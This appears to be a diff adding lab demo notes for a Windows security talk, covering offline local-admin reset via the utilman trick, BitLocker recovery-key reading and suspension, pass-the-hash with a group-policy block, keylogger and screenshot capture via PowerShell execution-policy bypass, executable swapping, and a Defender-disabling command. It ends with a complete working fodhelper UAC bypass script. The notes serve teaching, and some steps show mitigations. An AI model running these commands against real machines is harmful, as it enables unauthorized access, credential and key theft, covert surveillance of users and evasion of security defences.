@@ -1,0 +1,97 @@
+#reset local admin - nonbitlockered disk
+1. start cl10workgroup
+2. show we cannot logon as we dont know the password
+3. stop vm
+4. mount install media w10 and configure boot order
+5. start vm and boot to install media
+6. do the hack - utilman
+7. restart vm
+8. boot to original windows and show utilman hack doesnt work on 19h1
+9. hold shift and reboot the windows
+10. in start boot options select -> troubleshoot -> advanced opts -> startup settings -> restart
+11. press 8 to disable ELAM
+12. use the utilman hack and configure local administrator: net user administrator P@ssw0rd /active:yes
+13. show we cant see local account and cannot change because this is workgroup computer
+14. run taskmgr from hacked cmd and kill logonui
+15. sign in as new administrator account
+
+#how to protect - bitlocker - but never be local administrator!
+1. start cl10domain
+2. show we cannot logon as we dont know the password
+3. stop vm
+4. mount install media w10 and configure boot order
+5. start vm and boot to install media
+6. show you cant do the hack as the disk is encypted - "dir C:" and "manage-bde -status"
+7. restart - if you cant boot, remove the ISO and restart
+8. visualize malware - user is local administrator - why malware to extract keys when we can directly extract the data? we dont know what to extract!
+9. we can read Recovery Password:
+	Get-BitLockerVolume |select -expa keyprotector |select recoverypassword
+10. we can read MVK/FVEK from memory
+	BitColdKit
+	Passware Recovery Kit Forensic
+11. we can set recovery password
+	Get-BitLockerVolume -MountPoint C: | Add-BitLockerKeyProtector -RecoveryKeyProtector -RecoveryKeyPath \\server19\files
+12. we can suspend the bitlocker and do the hack
+	Suspend-Bitlocker -mountpoint C:
+13. somehow notify user to reboot so we can start our own winpe and do the hack
+14. mount iso and reboot the vm
+15. boot to winpe and do some hack
+16.??? secure boot ??? we can turn it off using dell/lenovo/hp utilities from running OS!
+
+#pass the hash
+1. sign in to CL10WG as localadmin and try \\cl10a\c$ - it wont work
+2. sign in to CL10WG as administrator and try \\cl10a\c$ - it will work -> pass-the-hash
+3. block on CL10A using group policy editor, under Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights\Assignments\Deny access to this computer from the network, and add one of those new well-known groups.
+4. restart CL10A and try the hack from CL10WG again
+
+# we can want to collect volatile data, not offline - for example keystrokes
+1. deploy spyware using previous example or via email
+2. run keylogger (run as admin file directly) from D: under JAN and show run as admin, run as different user etc.
+3. run keylogger from D: under DAN - he's not local admin but its the similar issue
+	- powershell exec policy block? fine, at least some protection, but can be avoided
+	powershell -exec bypass "& c:\keylogger.ps1"
+
+# we can want to collect volatile data, not offline - for example screenshots
+1. deploy startup script for admin users to install our module
+2. our module is installed after logon of admin user - jan
+	simulate in elevated posh console: install-module cyb3rtools
+	simulate we cant use module as the exec policy is blocking it
+3. overriden using bypass
+	powershell.exe -exec bypass -command "& powershell.exe" -noexit
+	ipmo cyb3rtools
+	get-command -module cyb3rtools
+	Invoke-CRScreenshot -OutputFolder .\
+	start . #show bmp
+	Invoke-CRScreenshot -OutputFolder .\ -RepetitionDurationSeconds 5 -RepetitionWaitMilliseconds 100 #after that do something on the screen
+	start . #show many bmps!
+
+# we can want to collect volatile data, not offline - so we need some apps - we can switch your running apps
+1. under jan copy rammap.exe to desktop
+2. start it
+3. steal 64bit version to documents
+4. stop the app
+5. move 64bit version to desktop
+6. start it
+7. do the same for vmmap but dont put the 64bit version back to desktop
+8. start rammap64
+9. move exe to downloads
+10. move vmmap64 to desktop and rename it
+11. wait for the user to run our new app ;)
+
+#uac? not for us
+1. start procexp
+2. select integrity column to show
+3. start eventvwr
+4. show handles
+5. stop AV (optional!!!)
+	Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true
+6. bypass uac
+read-host 'Press ENTER to implement the UAC bypass'
+[String]$program = "cmd /c powershell.exe" #default
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+read-host 'Press ENTER to start the UAC bypass'
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+read-host 'Press ENTER to remove the UAC bypass'
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
